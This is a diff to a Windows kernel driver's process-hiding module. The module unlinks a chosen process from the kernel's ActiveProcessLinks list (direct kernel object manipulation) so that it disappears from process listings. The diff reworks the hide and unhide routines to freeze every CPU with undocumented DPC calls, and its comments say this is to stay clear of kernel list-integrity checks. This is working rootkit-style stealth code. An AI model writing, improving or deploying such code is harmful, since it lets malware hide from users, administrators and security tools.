@@ -2,11 +2,81 @@
 #include "../DioProcessGlobals.h"
 #include "ProcessHide.h"
 
+// ============== Undocumented Kernel APIs ==============
+// These are exported by ntoskrnl but not declared in WDK headers.
+
+extern "C" {
+	NTKERNELAPI VOID KeGenericCallDpc(
+		_In_ PKDEFERRED_ROUTINE Routine,
+		_In_opt_ PVOID Context);
+
+	NTKERNELAPI VOID KeSignalCallDpcDone(
+		_In_ PVOID SystemArgument1);
+
+	NTKERNELAPI LOGICAL KeSignalCallDpcSynchronize(
+		_In_ PVOID SystemArgument2);
+}
+
 // ============== Global Variable Definitions ==============
 
 PHIDDEN_PROCESS_ENTRY g_ProcessHideListHead = NULL;
 ULONG g_ProcessHideCount = 0;
 BOOLEAN g_ProcessHideInitialized = FALSE;
+
+// ============== DPC Synchronization ==============
+// KeGenericCallDpc freezes ALL CPUs in a DPC, ensuring no CPU can run
+// list integrity checks (RtlpCheckListEntry) during our modification.
+
+enum DKOM_OPERATION { DKOM_UNLINK, DKOM_RELINK };
+
+typedef struct _DKOM_DPC_CONTEXT {
+	DKOM_OPERATION Operation;
+	PLIST_ENTRY TargetEntry;
+	PLIST_ENTRY InsertAfter;     // Only for DKOM_RELINK
+	volatile LONG WorkDone;
+} DKOM_DPC_CONTEXT, *PDKOM_DPC_CONTEXT;
+
+_IRQL_requires_(DISPATCH_LEVEL)
+static VOID DkomDpcRoutine(
+	_In_ PKDPC Dpc,
+	_In_opt_ PVOID DeferredContext,
+	_In_opt_ PVOID SystemArgument1,
+	_In_opt_ PVOID SystemArgument2)
+{
+	UNREFERENCED_PARAMETER(Dpc);
+
+	PDKOM_DPC_CONTEXT ctx = (PDKOM_DPC_CONTEXT)DeferredContext;
+
+	// Wait for ALL processors to enter this DPC before proceeding
+	KeSignalCallDpcSynchronize(SystemArgument2);
+
+	// Only one processor does the actual list modification
+	if (InterlockedCompareExchange(&ctx->WorkDone, 1, 0) == 0)
+	{
+		if (ctx->Operation == DKOM_UNLINK)
+		{
+			// Unlink from doubly-linked list
+			ctx->TargetEntry->Blink->Flink = ctx->TargetEntry->Flink;
+			ctx->TargetEntry->Flink->Blink = ctx->TargetEntry->Blink;
+
+			// Self-reference for stability
+			ctx->TargetEntry->Flink = ctx->TargetEntry;
+			ctx->TargetEntry->Blink = ctx->TargetEntry;
+		}
+		else // DKOM_RELINK
+		{
+			// Insert after InsertAfter: InsertAfter <-> [us] <-> next
+			PLIST_ENTRY next = ctx->InsertAfter->Flink;
+			ctx->TargetEntry->Flink = next;
+			ctx->TargetEntry->Blink = ctx->InsertAfter;
+			ctx->InsertAfter->Flink = ctx->TargetEntry;
+			next->Blink = ctx->TargetEntry;
+		}
+	}
+
+	// Signal this processor is done
+	KeSignalCallDpcDone(SystemArgument1);
+}
 
 // ============== Initialization / Cleanup ==============
 
@@ -33,10 +103,10 @@ VOID ProcessHide_Cleanup()
 	if (!g_ProcessHideInitialized)
 		return;
 
-	KIRQL oldIrql;
-	KeRaiseIrql(APC_LEVEL, &oldIrql);
+	WINDOWS_VERSION ver = GetWindowsVersion();
+	ULONG aplOffset = (ver != WINDOWS_UNSUPPORTED) ? EPROCESS_ACTIVEPROCESSLINKS_OFFSET[ver] : 0;
 
-	// Unhide all hidden processes before unloading
+	// Re-link all hidden processes back into ActiveProcessLinks before unloading
 	while (g_ProcessHideListHead)
 	{
 		PHIDDEN_PROCESS_ENTRY current = g_ProcessHideListHead;
@@ -44,18 +114,27 @@ VOID ProcessHide_Cleanup()
 
 		__try
 		{
-			// Validate pointers before restoring
-			if (current->ProcessListEntry && MmIsAddressValid(current->ProcessListEntry) &&
-				MmIsAddressValid(current->OriginalBlink) && MmIsAddressValid(current->OriginalFlink) &&
-				MmIsAddressValid(current->OriginalBlink->Flink) && MmIsAddressValid(current->OriginalFlink->Blink))
+			if (current->ProcessListEntry && MmIsAddressValid(current->ProcessListEntry) && aplOffset != 0)
 			{
-				// Restore the doubly-linked list
-				current->OriginalBlink->Flink = current->ProcessListEntry;
-				current->OriginalFlink->Blink = current->ProcessListEntry;
-				current->ProcessListEntry->Blink = current->OriginalBlink;
-				current->ProcessListEntry->Flink = current->OriginalFlink;
+				PEPROCESS currentProcess = PsGetCurrentProcess();
+				PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)currentProcess + aplOffset);
 
-				KdPrint((DRIVER_PREFIX "ProcessHide cleanup: restored PID %lu\n", pid));
+				if (MmIsAddressValid(head) && MmIsAddressValid(head->Flink))
+				{
+					// Use DPC synchronization for safe re-link
+					DKOM_DPC_CONTEXT dpcCtx = { 0 };
+					dpcCtx.Operation = DKOM_RELINK;
+					dpcCtx.TargetEntry = current->ProcessListEntry;
+					dpcCtx.InsertAfter = head;
+					dpcCtx.WorkDone = 0;
+					KeGenericCallDpc(DkomDpcRoutine, &dpcCtx);
+
+					KdPrint((DRIVER_PREFIX "ProcessHide cleanup: restored PID %lu\n", pid));
+				}
+				else
+				{
+					KdPrint((DRIVER_PREFIX "ProcessHide cleanup: list head invalid, skipping PID %lu\n", pid));
+				}
 			}
 			else
 			{
@@ -71,8 +150,6 @@ VOID ProcessHide_Cleanup()
 		ExFreePoolWithTag(current, DKOM_POOL_TAG);
 		g_ProcessHideCount--;
 	}
-
-	KeLowerIrql(oldIrql);
 
 	g_ProcessHideInitialized = FALSE;
 	KdPrint((DRIVER_PREFIX "ProcessHide cleanup complete\n"));
@@ -107,7 +184,7 @@ NTSTATUS ProcessHide_Hide(ULONG Pid)
 		check = check->Next;
 	}
 
-	// Pre-allocate tracking entry BEFORE raising IRQL (pool alloc can't be at elevated IRQL)
+	// Pre-allocate tracking entry (can't allocate pool at DISPATCH_LEVEL)
 	PHIDDEN_PROCESS_ENTRY hidden = (PHIDDEN_PROCESS_ENTRY)ExAllocatePool2(
 		POOL_FLAG_NON_PAGED,
 		sizeof(HIDDEN_PROCESS_ENTRY),
@@ -127,18 +204,14 @@ NTSTATUS ProcessHide_Hide(ULONG Pid)
 
 	NTSTATUS status = STATUS_NOT_FOUND;
 
-	// Raise IRQL to prevent preemption during list modification
-	KIRQL oldIrql;
-	KeRaiseIrql(APC_LEVEL, &oldIrql);
-
 	__try
 	{
-		// Walk ActiveProcessLinks from current process
+		// Walk ActiveProcessLinks to find the target PID
 		PEPROCESS currentProcess = PsGetCurrentProcess();
 		PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)currentProcess + aplOffset);
 		PLIST_ENTRY head = listEntry;
 		ULONG safetyCounter = 0;
-		const ULONG MAX_WALK = 65536;  // Safety limit to prevent infinite loop
+		const ULONG MAX_WALK = 65536;
 
 		do {
 			if (!MmIsAddressValid(listEntry))
@@ -182,18 +255,17 @@ NTSTATUS ProcessHide_Hide(ULONG Pid)
 					break;
 				}
 
-				// Insert into tracking list (BEFORE unlinking so cleanup can restore on failure)
+				// Insert into tracking list BEFORE the DPC unlink
 				hidden->Next = g_ProcessHideListHead;
 				g_ProcessHideListHead = hidden;
 				g_ProcessHideCount++;
 
-				// Unlink from ActiveProcessLinks
-				listEntry->Blink->Flink = listEntry->Flink;
-				listEntry->Flink->Blink = listEntry->Blink;
-
-				// Self-reference for stability (process kernel code still walks its own node)
-				listEntry->Flink = listEntry;
-				listEntry->Blink = listEntry;
+				// Unlink via DPC synchronization (freezes all CPUs)
+				DKOM_DPC_CONTEXT dpcCtx = { 0 };
+				dpcCtx.Operation = DKOM_UNLINK;
+				dpcCtx.TargetEntry = listEntry;
+				dpcCtx.WorkDone = 0;
+				KeGenericCallDpc(DkomDpcRoutine, &dpcCtx);
 
 				KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu (%s) hidden via DKOM\n", Pid, hidden->ImageFileName));
 				hidden = NULL;  // Don't free — it's in the tracking list now
@@ -217,8 +289,6 @@ NTSTATUS ProcessHide_Hide(ULONG Pid)
 		status = STATUS_UNHANDLED_EXCEPTION;
 	}
 
-	KeLowerIrql(oldIrql);
-
 	// Free the pre-allocated entry if we didn't use it
 	if (hidden)
 	{
@@ -235,11 +305,13 @@ NTSTATUS ProcessHide_Unhide(ULONG Pid)
 	if (!g_ProcessHideInitialized)
 		return STATUS_NOT_SUPPORTED;
 
-	NTSTATUS status = STATUS_NOT_FOUND;
+	WINDOWS_VERSION ver = GetWindowsVersion();
+	if (ver == WINDOWS_UNSUPPORTED)
+		return STATUS_NOT_SUPPORTED;
 
-	// Raise IRQL during list re-link
-	KIRQL oldIrql;
-	KeRaiseIrql(APC_LEVEL, &oldIrql);
+	ULONG aplOffset = EPROCESS_ACTIVEPROCESSLINKS_OFFSET[ver];
+
+	NTSTATUS status = STATUS_NOT_FOUND;
 
 	__try
 	{
@@ -250,21 +322,31 @@ NTSTATUS ProcessHide_Unhide(ULONG Pid)
 		{
 			if (current->Pid == Pid)
 			{
-				// Validate all pointers before touching the list
-				if (!current->ProcessListEntry || !MmIsAddressValid(current->ProcessListEntry) ||
-					!MmIsAddressValid(current->OriginalBlink) || !MmIsAddressValid(current->OriginalFlink) ||
-					!MmIsAddressValid(current->OriginalBlink->Flink) || !MmIsAddressValid(current->OriginalFlink->Blink))
+				if (!current->ProcessListEntry || !MmIsAddressValid(current->ProcessListEntry))
 				{
-					KdPrint((DRIVER_PREFIX "ProcessHide: invalid pointers for PID %lu, cannot unhide\n", Pid));
+					KdPrint((DRIVER_PREFIX "ProcessHide: ProcessListEntry invalid for PID %lu\n", Pid));
 					status = STATUS_INVALID_ADDRESS;
 					break;
 				}
 
-				// Restore doubly-linked list
-				current->OriginalBlink->Flink = current->ProcessListEntry;
-				current->OriginalFlink->Blink = current->ProcessListEntry;
-				current->ProcessListEntry->Blink = current->OriginalBlink;
-				current->ProcessListEntry->Flink = current->OriginalFlink;
+				// Insert after current process's list head (always valid)
+				PEPROCESS currentProcess = PsGetCurrentProcess();
+				PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)currentProcess + aplOffset);
+
+				if (!MmIsAddressValid(head) || !MmIsAddressValid(head->Flink))
+				{
+					KdPrint((DRIVER_PREFIX "ProcessHide: list head invalid, cannot unhide PID %lu\n", Pid));
+					status = STATUS_INVALID_ADDRESS;
+					break;
+				}
+
+				// Re-link via DPC synchronization (freezes all CPUs)
+				DKOM_DPC_CONTEXT dpcCtx = { 0 };
+				dpcCtx.Operation = DKOM_RELINK;
+				dpcCtx.TargetEntry = current->ProcessListEntry;
+				dpcCtx.InsertAfter = head;
+				dpcCtx.WorkDone = 0;
+				KeGenericCallDpc(DkomDpcRoutine, &dpcCtx);
 
 				// Remove from tracking list
 				if (prev)
@@ -274,9 +356,8 @@ NTSTATUS ProcessHide_Unhide(ULONG Pid)
 
 				g_ProcessHideCount--;
 
-				KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu (%s) restored\n", Pid, current->ImageFileName));
+				KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu (%s) restored via DPC sync\n", Pid, current->ImageFileName));
 
-				KeLowerIrql(oldIrql);
 				ExFreePoolWithTag(current, DKOM_POOL_TAG);
 				return STATUS_SUCCESS;
 			}
@@ -290,8 +371,6 @@ NTSTATUS ProcessHide_Unhide(ULONG Pid)
 		KdPrint((DRIVER_PREFIX "ProcessHide: exception during unhide of PID %lu (0x%X)\n", Pid, GetExceptionCode()));
 		status = STATUS_UNHANDLED_EXCEPTION;
 	}
-
-	KeLowerIrql(oldIrql);
 
 	if (status == STATUS_NOT_FOUND)
 		KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu not found in hidden list\n", Pid));
